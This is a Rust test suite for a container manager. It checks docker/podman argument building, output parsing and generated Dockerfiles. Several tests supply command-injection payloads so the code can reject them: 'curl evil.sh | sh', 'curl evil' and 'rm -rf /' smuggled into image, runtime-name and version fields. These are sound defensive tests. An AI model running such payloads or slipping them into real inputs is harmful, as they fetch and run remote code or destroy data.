//! Contract tests for `src/core/container.rs` (cov-12).
//!
//! Two layers are pinned here:
//!
//! 1. **Arg construction** for `run`/`exec`/`pull`/`stop`/`build_with_options`
//!    and the TSV parsing of `list_running`/`list_images`. These normally need
//!    a live Docker/Podman daemon, so each test installs a fake `docker` /
//!    `podman` executable that records its exact argv one-arg-per-line into a
//!    log file and exits with a configurable code. Prepending the fake dir to
//!    `PATH` shadows any real runtime, making every argv contract falsifiable
//!    on a daemon-less machine.
//! 2. **generate_dockerfile** per-runtime blocks and per-base-image-family
//!    fallbacks, plus the security fallbacks (unsafe base image, runtime name,
//!    version). Generated version guards execute against private matching,
//!    mismatching, empty and failed providers; installer recipes retain their
//!    download-before-execution and explicit request contracts.

pub mod common;

use common::*;
use omg_lib::core::container::{
    ContainerConfig, ContainerManager, ContainerRuntime, GeneratedDockerfile, dev_container_config,
};
use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

// ===========================================================================
// Fake container runtime harness
// ===========================================================================

/// Environment keys consumed by the fake runtime script.
const FAKE_LOG_ENV: &str = "OMG_FAKE_RUNTIME_LOG";
const FAKE_EXIT_ENV: &str = "OMG_FAKE_RUNTIME_EXIT";
const FAKE_STDERR_ENV: &str = "OMG_FAKE_RUNTIME_STDERR";

struct FakeRuntime {
    _dir: tempfile::TempDir,
    bin_dir: PathBuf,
    log_path: PathBuf,
}

impl FakeRuntime {
    /// Create a temp dir holding fake `docker` and `podman` executables.
    fn new() -> Self {
        let tmp = tempfile::tempdir().expect("fake runtime tempdir");
        let bin_dir = tmp.path().to_path_buf();
        let log_path = tmp.path().join("argv.log");
        // Forked children can retain a writer after the parent closes it (#785).
        let script = Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/fake-runtime.sh");
        for command in ["docker", "podman"] {
            let script_path = tmp.path().join(command);
            std::os::unix::fs::symlink(&script, &script_path).expect("link fake runtime fixture");
        }
        Self {
            _dir: tmp,
            bin_dir,
            log_path,
        }
    }

    /// Run `f` with the fake runtime shadowing any real docker/podman on PATH.
    ///
    /// Serialized by `#[serial]` at every call site because PATH is process
    /// global.
    fn with_shadowed_path<T>(&self, f: impl FnOnce(&Self) -> T) -> T {
        let original = std::env::var("PATH").unwrap_or_default();
        let shadowed = format!("{}:{original}", self.bin_dir.display());
        temp_env::with_vars(
            [
                ("PATH", Some(shadowed.as_str())),
                (FAKE_LOG_ENV, Some(self.log_path.to_str().unwrap())),
            ],
            || f(self),
        )
    }

    /// Run `f` with the fake runtime forced to exit with `code`.
    #[allow(clippy::unused_self)]
    fn with_exit_code<T>(&self, code: i32, f: impl FnOnce() -> T) -> T {
        let code_str = code.to_string();
        temp_env::with_vars([(FAKE_EXIT_ENV, Some(code_str.as_str()))], f)
    }

    /// Run `f` with the fake runtime printing `message` to stderr.
    #[allow(clippy::unused_self)]
    fn with_stderr<T>(&self, message: &str, f: impl FnOnce() -> T) -> T {
        temp_env::with_vars([(FAKE_STDERR_ENV, Some(message))], f)
    }

    /// Exact argv recorded by the fake runtime, one argument per element.
    fn recorded_argv(&self) -> Vec<String> {
        let raw = fs::read_to_string(&self.log_path).expect("fake runtime must have been invoked");
        raw.lines().map(str::to_string).collect()
    }
}

// ===========================================================================
// Arg construction: run
// ===========================================================================

#[test]
#[serial]
fn run_builds_exact_argv_with_all_config_flags_in_documented_order() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let config = ContainerConfig {
            image: "ubuntu:24.04".into(),
            name: Some("proj-dev".into()),
            env: vec![("TERM".into(), "xterm-256color".into())],
            volumes: vec![("/home/me/proj".into(), "/app".into())],
            workdir: Some("/app".into()),
            rm: true,
            interactive: true,
        };

        let code = manager
            .run(&config, &["sh", "-lc", "echo hi"])
            .expect("run against fake runtime must succeed");
        assert_eq!(code, 0, "exit code must be forwarded from the runtime");

        assert_eq!(
            fake.recorded_argv(),
            vec![
                "run",
                "--rm",
                "-it",
                "--name",
                "proj-dev",
                "-w",
                "/app",
                "-e",
                "TERM=xterm-256color",
                "-v",
                "/home/me/proj:/app",
                "--",
                "ubuntu:24.04",
                "sh",
                "-lc",
                "echo hi",
            ]
        );
    });
}

#[test]
#[serial]
fn run_omits_flags_when_rm_and_interactive_are_disabled() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Podman);
        let config = ContainerConfig {
            image: "alpine:3.20".into(),
            rm: false,
            interactive: false,
            ..ContainerConfig::default()
        };

        manager
            .run(&config, &["true"])
            .expect("non-interactive run must succeed");

        assert_eq!(
            fake.recorded_argv(),
            vec!["run", "--", "alpine:3.20", "true"],
            "--rm and -it must be omitted entirely when disabled"
        );
    });
}

#[test]
#[serial]
fn run_rejects_invalid_image_before_spawning_the_runtime() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let config = ContainerConfig {
            image: "ubuntu:24.04; curl evil.sh | sh".into(),
            rm: true,
            interactive: false,
            ..ContainerConfig::default()
        };

        let error = manager
            .run(&config, &["sh"])
            .expect_err("injected image ref must be rejected");

        assert!(
            error.to_string().contains("Invalid character ';'"),
            "error must name the rejected character, got: {error:#}"
        );
        assert!(
            !fake.log_path.exists(),
            "validation must happen before any process spawn"
        );
    });
}

#[test]
#[serial]
fn run_rejects_option_like_container_name_before_spawning() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let config = ContainerConfig {
            image: "ubuntu:24.04".into(),
            name: Some("-pwn".into()),
            rm: true,
            interactive: false,
            ..ContainerConfig::default()
        };

        let error = manager
            .run(&config, &["sh"])
            .expect_err("option-like container name must be rejected");

        assert!(
            error.to_string().contains("option injection protection"),
            "error must explain option-injection protection, got: {error:#}"
        );
        assert!(
            !fake.log_path.exists(),
            "invalid name must never reach the runtime process"
        );
    });
}

// ===========================================================================
// Arg construction: exec / pull / stop / build
// ===========================================================================

#[test]
#[serial]
fn exec_builds_exact_argv_and_validates_container_name() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Podman);

        let interactive = manager
            .exec("web-server", &["ps", "aux"], true)
            .expect("exec ok");
        assert_eq!(interactive, 0);

        let batch = manager
            .exec("web-server", &["env"], false)
            .expect("batch exec ok");
        assert_eq!(batch, 0);

        assert_eq!(
            fake.recorded_argv(),
            vec![
                "exec",
                "-it",
                "--",
                "web-server",
                "ps",
                "aux", // first invocation
                "exec",
                "--",
                "web-server",
                "env", // second invocation
            ],
            "second exec must drop -it when not interactive; -- must separate from args"
        );
        assert_eq!(fake.recorded_argv().len(), 10);

        let error = manager
            .exec("-pwn", &["sh"], false)
            .expect_err("option-like container name in exec must be rejected");
        assert!(error.to_string().contains("option injection protection"));
    });
}

#[test]
#[serial]
fn pull_builds_exact_argv_maps_failure_and_rejects_bad_refs_before_spawn() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);

        manager.pull("ubuntu:24.04").expect("pull success path");
        assert_eq!(fake.recorded_argv(), vec!["pull", "--", "ubuntu:24.04"]);

        let error = fake.with_exit_code(7, || {
            manager
                .pull("ubuntu:24.04")
                .expect_err("non-zero pull must fail")
        });
        assert_eq!(
            error.to_string(),
            "Failed to pull image: ubuntu:24.04",
            "failure message must carry the image name verbatim"
        );

        let error = manager
            .pull("registry.example/ubuntu evil")
            .expect_err("image refs with spaces must be rejected before spawning");
        assert!(error.to_string().contains("Invalid character ' '"));
        assert_eq!(
            fake.recorded_argv().len(),
            6,
            "rejected pull must add no new runtime invocations"
        );
    });
}

#[test]
#[serial]
fn stop_succeeds_silently_but_bails_with_name_on_failure() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);

        manager
            .stop("web-server")
            .expect("stop of healthy container succeeds");
        assert_eq!(fake.recorded_argv(), vec!["stop", "--", "web-server"]);

        let error = fake.with_exit_code(1, || {
            manager
                .stop("web-server")
                .expect_err("failed stop must be an error")
        });
        assert_eq!(error.to_string(), "Failed to stop container: web-server");

        let error = manager
            .stop("web/../escape")
            .expect_err("traversal-style container names must be rejected pre-spawn");
        assert!(
            error.to_string().contains("path traversal protection"),
            "got: {error:#}"
        );
    });
}

#[test]
#[serial]
fn build_with_options_passes_every_flag_and_reports_failure_exit_code() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Podman);
        let dockerfile = Path::new("Dockerfile");
        let context = Path::new("/home/me/proj");

        manager
            .build_with_options(
                dockerfile,
                "proj:dev",
                context,
                true,
                &["NODE_VERSION=20".to_string()],
                Some("builder"),
            )
            .expect("build against fake runtime must succeed");

        assert_eq!(
            fake.recorded_argv(),
            vec![
                "build",
                "-f",
                "Dockerfile",
                "-t",
                "proj:dev",
                "--no-cache",
                "--build-arg",
                "NODE_VERSION=20",
                "--target",
                "builder",
                "--",
                "/home/me/proj",
            ]
        );

        // no_cache=false and target=None must omit their flags entirely.
        let config_only_argv_len = fake.recorded_argv().len();
        manager
            .build_with_options(dockerfile, "proj:slim", context, false, &[], None)
            .expect("minimal build must succeed");
        assert_eq!(
            &fake.recorded_argv()[config_only_argv_len..],
            &[
                "build",
                "-f",
                "Dockerfile",
                "-t",
                "proj:slim",
                "--",
                "/home/me/proj",
            ]
        );

        let error = fake.with_exit_code(5, || {
            manager
                .build_with_options(dockerfile, "proj:dev", context, false, &[], None)
                .expect_err("failed build must be an error")
        });
        assert_eq!(
            error.to_string(),
            "Container build failed with exit code: Some(5)",
            "failure message must report the runtime's exit status"
        );
    });
}

// ===========================================================================
// list_running / list_images: TSV parsing and failure mapping
// ===========================================================================

#[test]
#[serial]
fn list_running_parses_runtime_tsv_into_exact_fields() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);

        let containers = manager.list_running().expect("listing via fake runtime");
        assert_eq!(containers.len(), 1, "exactly one container row expected");
        let c = &containers[0];
        assert_eq!(c.id, "abc123def");
        assert_eq!(c.name, "web-server");
        assert_eq!(c.image, "ubuntu:24.04");
        assert_eq!(c.status, "Up 2 minutes");

        let argv = fake.recorded_argv();
        assert_eq!(
            argv,
            vec![
                "ps",
                "--format",
                "{{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}"
            ],
            "the format string must request exactly ID/Names/Image/Status tab-separated"
        );
    });
}

#[test]
#[serial]
fn list_running_maps_failure_to_error_carrying_status_and_stderr() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);

        let error = fake
            .with_stderr("Cannot connect to the Docker daemon", || {
                fake.with_exit_code(3, || manager.list_running())
            })
            .expect_err("failed listing must surface as an error");

        let rendered = error.to_string();
        assert!(
            rendered.contains("Container listing failed with status Some(3)"),
            "error must include operation name and exit status, got: {rendered}"
        );
        assert!(
            rendered.contains("Cannot connect to the Docker daemon"),
            "error must include trimmed stderr, got: {rendered}"
        );
    });
}

#[test]
#[serial]
fn list_images_parses_runtime_tsv_into_exact_fields() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let images = manager
            .list_images()
            .expect("image listing via fake runtime");
        assert_eq!(
            images.len(),
            1,
            "exactly one image row expected from fixture output"
        );
        assert_eq!(images[0].repository, "ubuntu");
        assert_eq!(images[0].tag, "24.04");
        assert_eq!(images[0].id, "sha256:def456");
        assert_eq!(images[0].size, "120MB");

        let argv = fake.recorded_argv();
        assert_eq!(
            argv,
            vec![
                "images",
                "--format",
                "{{.Repository}}\t{{.Tag}}\t{{.ID}}\t{{.Size}}"
            ]
        );
    });
}

// ===========================================================================
// generate_dockerfile: per-runtime blocks
// ===========================================================================

fn dockerfile_for(base_image: &str, runtimes: &[(&str, &str)]) -> String {
    generated_for(base_image, runtimes).content
}

fn generated_for(base_image: &str, runtimes: &[(&str, &str)]) -> GeneratedDockerfile {
    ContainerManager::with_runtime(ContainerRuntime::Docker).generate_dockerfile(
        base_image,
        runtimes,
        &omg_lib::core::container::InstallerDigests::new(),
    )
}

fn assert_runtime_request_refused(base: &str, runtime: &str, request: &str) {
    let generated = generated_for(base, &[(runtime, request)]);
    assert!(
        generated
            .runtime_errors
            .iter()
            .any(|error| error.to_ascii_lowercase().contains(runtime)),
        "unsupported {runtime} request {request:?} must be reported: {generated:?}"
    );
    assert!(
        generated.content.contains(&format!(
            "OMG cannot satisfy runtime version request for {runtime}"
        )) && generated.content.contains(" >&2; exit 1"),
        "direct Dockerfile consumers must also fail closed: {}",
        generated.content
    );
    assert!(
        generated.unpinned_urls.is_empty(),
        "refused requests must not schedule installer downloads: {generated:?}"
    );
}

/// Run the emitted shell, including its real provider-status handling. A
/// matching output from a failed provider must not be accepted as a version.
fn assert_generated_version_guard(
    dockerfile: &str,
    runtime: &str,
    matching: &str,
    mismatching: &str,
) {
    let checks: Vec<_> = dockerfile
        .lines()
        .filter_map(|line| line.strip_prefix("RUN "))
        .filter(|line| line.contains(&format!("OMG runtime version mismatch: {runtime} ")))
        .collect();
    assert_eq!(
        checks.len(),
        1,
        "one executable {runtime} guard required:\n{dockerfile}"
    );
    let fixture = tempfile::tempdir().expect("private version provider directory");
    let bin = fixture.path().join("bin");
    fs::create_dir(&bin).expect("provider bin directory");
    let program = bin.join(if runtime == "python" {
        "python3"
    } else {
        runtime
    });
    for (output, exit_code, accepted) in [
        (matching, 0, true),
        (mismatching, 0, false),
        (matching, 17, false),
        ("", 0, false),
    ] {
        fs::write(
            &program,
            format!(
                "#!/bin/sh\nprintf '%s\\n' '{}'\nexit {exit_code}\n",
                output.replace('\'', "'\\''")
            ),
        )
        .expect("write isolated version provider");
        fs::set_permissions(&program, fs::Permissions::from_mode(0o755))
            .expect("provider executable permissions");
        let result = std::process::Command::new("/bin/sh")
            .args(["-c", checks[0]])
            .current_dir(fixture.path())
            .env("PATH", format!("{}:/usr/bin:/bin", bin.display()))
            .output()
            .expect("execute actual generated version guard");
        assert_eq!(
            result.status.success(),
            accepted,
            "{runtime} guard with output {output:?}, provider exit {exit_code}: status={}, stdout={:?}, stderr={:?}",
            result.status,
            String::from_utf8_lossy(&result.stdout),
            String::from_utf8_lossy(&result.stderr)
        );
    }
    fixture.close().expect("remove version provider fixture");
}

#[test]
fn dockerfile_node_versions_map_to_nodesource_major_channels() {
    let major = dockerfile_for("ubuntu:24.04", &[("node", "20")]);
    assert!(
        major.contains("# Install Node.js\n"),
        "node block marker missing"
    );
    assert!(
        major.contains("ENV NODE_VERSION=20\n"),
        "numeric major must select NODE_VERSION=20, got:\n{major}"
    );
    assert_generated_version_guard(&major, "node", "20.13.1", "21.0.0");
    assert!(
        major.contains("-o /tmp/nodesource-setup.sh https://deb.nodesource.com/setup_20.x")
            && major.contains("bash /tmp/nodesource-setup.sh")
            && !major.contains("setup_20.x | bash"),
        "NodeSource setup must be downloaded before execution, got:\n{major}"
    );

    let explicit = dockerfile_for("debian:bookworm-slim", &[("node", "21.7.0")]);
    assert!(explicit.contains("ENV NODE_VERSION=21\n"));
    assert!(explicit.contains("https://deb.nodesource.com/setup_21.x"));
    assert_generated_version_guard(&explicit, "node", "21.7.0", "21.7.1");
    assert_runtime_request_refused("ubuntu:24.04", "node", "lts");
}

#[test]
fn dockerfile_go_requires_an_exact_release_and_verifies_the_installed_provider() {
    assert_runtime_request_refused("ubuntu:24.04", "go", "latest");
    assert_runtime_request_refused("ubuntu:24.04", "go", "1.23");
    let pinned = dockerfile_for("ubuntu:24.04", &[("go", "1.22.0")]);
    assert!(
        pinned.contains("ENV GO_VERSION=1.22.0\n"),
        "an explicit release must retain GO_VERSION=1.22.0, got:\n{pinned}"
    );
    assert!(
        pinned.contains("-o /tmp/omg-go.tar.gz https://go.dev/dl/go1.22.0.linux-amd64.tar.gz")
            && pinned.contains("tar -C /usr/local -xzf /tmp/omg-go.tar.gz"),
        "go tarball must be downloaded before extraction, got:\n{pinned}"
    );
    assert!(pinned.contains("ENV PATH=$PATH:/usr/local/go/bin"));
    assert!(pinned.contains("OMG Go archive requires Debian amd64"));
    assert_generated_version_guard(
        &pinned,
        "go",
        "go version go1.22.0 linux/amd64",
        "go version go1.22.1 linux/amd64",
    );

    let explicit = dockerfile_for("ubuntu:24.04", &[("go", "1.23.4")]);
    assert!(explicit.contains("ENV GO_VERSION=1.23.4\n"));
    assert!(explicit.contains("https://go.dev/dl/go1.23.4.linux-amd64.tar.gz"));
    assert_generated_version_guard(
        &explicit,
        "go",
        "go version go1.23.4 linux/amd64",
        "go version go1.23.5 linux/amd64",
    );
}

#[test]
fn dockerfile_java_selects_package_by_version_shape() {
    let digits = dockerfile_for("ubuntu:24.04", &[("java", "17")]);
    assert!(
        digits.contains("apt-get install -y openjdk-17-jdk \\\n"),
        "all-digit java version must map to openjdk-<v>-jdk, got:\n{digits}"
    );
    assert_generated_version_guard(
        &digits,
        "java",
        "openjdk version \"17.0.15\" 2025-04-15",
        "openjdk version \"21.0.1\" 2023-10-17",
    );

    let system = dockerfile_for("ubuntu:24.04", &[("java", "system")]);
    assert!(system.contains("apt-get install -y default-jdk &&"));
    assert!(system.contains("# java: distribution default (no version pin)"));
    assert_runtime_request_refused("ubuntu:24.04", "java", "latest");

    let empty = dockerfile_for("ubuntu:24.04", &[("java", "")]);
    assert!(
        empty.contains("apt-get install -y default-jdk \\\n"),
        "empty java version must fall back to default-jdk"
    );
}

#[test]
fn dockerfile_ruby_distinguishes_system_packages_from_verified_version_requests() {
    let system = dockerfile_for("debian:bookworm-slim", &[("ruby", "system")]);
    assert!(system.contains("apt-get install -y ruby &&"));
    assert!(system.contains("# ruby: distribution default (no version pin)"));
    assert_runtime_request_refused("debian:bookworm-slim", "ruby", "latest");

    let pinned = dockerfile_for("debian:bookworm-slim", &[("ruby", "3.2.1")]);
    assert!(
        pinned.contains("apt-get install -y ruby3.2 \\\n"),
        "pinned ruby must map to the distro's major.minor package, got:\n{pinned}"
    );
    assert_generated_version_guard(&pinned, "ruby", "3.2.1", "3.2.2");
}

#[test]
fn dockerfile_rust_installs_exact_toolchain_via_rustup() {
    let df = dockerfile_for("ubuntu:24.04", &[("rust", "1.75.0")]);
    assert!(df.contains("ENV RUSTUP_HOME=/usr/local/rustup \\"));
    assert!(df.contains("CARGO_HOME=/usr/local/cargo \\"));
    assert!(
        df.contains("-o /tmp/omg-rustup-init.sh")
            && df.contains("https://sh.rustup.rs")
            && df.contains("sh /tmp/omg-rustup-init.sh -s -- -y --default-toolchain 1.75.0"),
        "rustup invocation must pass the requested toolchain verbatim, got:\n{df}"
    );
}

#[test]
fn dockerfile_python_labels_distro_default_and_checks_the_requested_version() {
    let df = dockerfile_for("ubuntu:24.04", &[("python", "3.11.0")]);
    assert!(
        !df.contains("ENV PYTHON_VERSION="),
        "a label cannot pin distro Python"
    );
    assert!(df.contains("# Install Python (distribution default)"));
    assert!(df.contains("# Required Python version: 3.11.0"));
    assert!(df.contains("python3 python3-pip python3-venv \\"));
    assert!(df.contains("ln -sf /usr/bin/python3 /usr/bin/python"));
    assert_generated_version_guard(&df, "python", "3.11.0", "3.12.0");
}

#[test]
fn dockerfile_bun_installs_via_official_script_and_extends_path() {
    let df = dockerfile_for("ubuntu:24.04", &[("bun", "1.1.38")]);
    assert!(
        df.contains("-o /tmp/omg-bun-install.sh https://bun.sh/install")
            && df.contains("bash /tmp/omg-bun-install.sh"),
        "bun install script must be downloaded before execution, got:\n{df}"
    );
    assert!(df.contains("ENV PATH=$PATH:/root/.bun/bin"));
    assert_generated_version_guard(&df, "bun", "1.1.38", "1.1.39");
    assert_runtime_request_refused("ubuntu:24.04", "bun", "ignored");
}

#[test]
fn dockerfile_unknown_runtime_falls_back_per_base_image_family() {
    let cases: &[(&str, &str)] = &[
        (
            "archlinux:latest",
            "# Install htop\nRUN pacman -S --noconfirm htop\n",
        ),
        (
            "alpine:3.20",
            "# Install htop\nRUN apk add --no-cache htop\n",
        ),
        (
            "fedora:40",
            "# Install htop\nRUN dnf install -y htop && dnf clean all\n",
        ),
        (
            "centos:stream9",
            "# Install htop\nRUN dnf install -y htop && dnf clean all\n",
        ),
        (
            "opensuse/leap:15",
            "# Install htop\nRUN zypper install -y htop && zypper clean\n",
        ),
    ];

    for &(base, expected_block) in cases {
        let df = dockerfile_for(base, &[("htop", "latest")]);
        assert!(
            df.contains(expected_block),
            "base {base} must emit family-specific install block {expected_block:?}, got:\n{df}"
        );
    }
}

#[test]
fn dockerfile_truly_unknown_base_image_emits_manual_install_warning() {
    let df = dockerfile_for("distroless:latest", &[("htop", "system")]);
    assert!(
        df.contains("# WARNING: Unknown base image 'distroless:latest'"),
        "unrecognized base must warn explicitly, got:\n{df}"
    );
    assert!(df.contains(
        "# Please manually install htop system using your distribution's package manager"
    ));
    assert!(df.contains(
        "# Supported base images: ubuntu, debian, arch, alpine, fedora, rhel, centos, opensuse"
    ));
    assert!(
        !df.contains("install -y htop"),
        "no package-manager line may be fabricated for an unknown base"
    );
    assert_runtime_request_refused("distroless:latest", "htop", "1.0");
}

#[test]
fn dockerfile_numeric_major_and_minor_guards_respect_component_boundaries() {
    for (request, accepted, rejected) in [("3", "3.12.9", "30.12.9"), ("3.11", "3.11.9", "3.110.9")]
    {
        let df = dockerfile_for("ubuntu:24.04", &[("python", request)]);
        assert_generated_version_guard(&df, "python", accepted, rejected);
    }
}

#[test]
fn dockerfile_unsafe_inputs_never_reach_generated_text() {
    // Unsafe base image falls back to ubuntu:24.04.
    let df = dockerfile_for("ubuntu:24.04 && RUN curl evil.sh | sh", &[]);
    assert!(
        df.starts_with("FROM ubuntu:24.04\n"),
        "fallback base required"
    );

    // Unsafe runtime name skips the whole entry.
    let df = dockerfile_for("ubuntu:24.04", &[("pkg; curl evil", "1.0")]);
    assert!(
        !df.contains("curl evil"),
        "runtime-name payload must not survive"
    );
    assert!(!df.contains("pkg;"));

    // Unsafe version must NOT survive into the Dockerfile — the sanitizer
    // strips it and falls back to the default. Assert the payload is absent
    // and a clean NODE_VERSION line exists.
    let df = dockerfile_for("ubuntu:24.04", &[("node", "20; rm -rf /")]);
    // The version must be a clean numeric value or the explicit default, not
    // the injected payload.
    let node_version_line = df
        .lines()
        .find(|line| line.starts_with("ENV NODE_VERSION="))
        .expect("Node Dockerfile must declare NODE_VERSION");
    let node_version = node_version_line
        .strip_prefix("ENV NODE_VERSION=")
        .expect("matched NODE_VERSION prefix");
    assert!(
        node_version == "latest"
            || node_version
                .chars()
                .all(|character| character.is_ascii_digit() || character == '.'),
        "NODE_VERSION must be a safe default: {node_version_line}"
    );
    assert!(
        !df.contains("20;"),
        "unsafe version payload must not survive"
    );
}

#[test]
fn dockerfile_alpine_base_switches_common_deps_to_apk() {
    let df = dockerfile_for("alpine:3.20", &[]);
    assert!(
        df.contains("FROM alpine:3.20\n"),
        "valid base image must pass through unchanged"
    );
    assert!(df.contains("apk add --no-cache \\\n    curl wget git build-base"));
    assert!(
        !df.contains("apt-get"),
        "alpine base must not emit apt commands"
    );
}

#[test]
fn dockerfile_arch_base_switches_common_deps_to_pacman() {
    let df = dockerfile_for("archlinux:latest", &[]);
    assert!(df.contains(
        "RUN pacman -Syu --noconfirm && pacman -S --noconfirm \\\n    curl wget git base-devel\n\n"
    ));
    assert!(!df.contains("apt-get"));
}

#[test]
fn dockerfile_always_ends_with_workdir_copy_cmd_tail() {
    let df = dockerfile_for("ubuntu:24.04", &[]);
    assert!(df.contains("WORKDIR /app\n"));
    assert!(df.contains("COPY . ."));
    assert!(
        df.ends_with("CMD [\"/bin/bash\"]\n"),
        "tail must terminate the Dockerfile, got: {:?}",
        &df[df.len().saturating_sub(60)..]
    );
}

// ===========================================================================
// Pure metadata contracts
// ===========================================================================

#[test]
fn dev_container_config_names_mounts_and_enters_project_dir() {
    let project = tempfile::tempdir().expect("project tempdir");
    let dir_name = project.path().file_name().unwrap().to_str().unwrap();
    let safe_dir_name = dir_name.trim_start_matches('.');

    let config = dev_container_config(project.path());
    assert_eq!(
        config.name.as_deref(),
        Some(&*format!("{safe_dir_name}-dev"))
    );
    assert_eq!(config.image, "ubuntu:24.04");
    assert_eq!(
        config.env,
        vec![("TERM".to_string(), "xterm-256color".to_string())]
    );
    assert_eq!(
        config.volumes,
        vec![(project.path().display().to_string(), "/app".to_string())],
        "project dir must be mounted at /app"
    );
    assert_eq!(config.workdir.as_deref(), Some("/app"));
    assert!(config.rm && config.interactive);
}

#[test]
fn container_runtime_display_and_command_names_match_binary_and_label() {
    assert_eq!(ContainerRuntime::Docker.command(), "docker");
    assert_eq!(ContainerRuntime::Podman.command(), "podman");
    assert_eq!(ContainerRuntime::Docker.to_string(), "Docker");
    assert_eq!(ContainerRuntime::Podman.to_string(), "Podman");
}
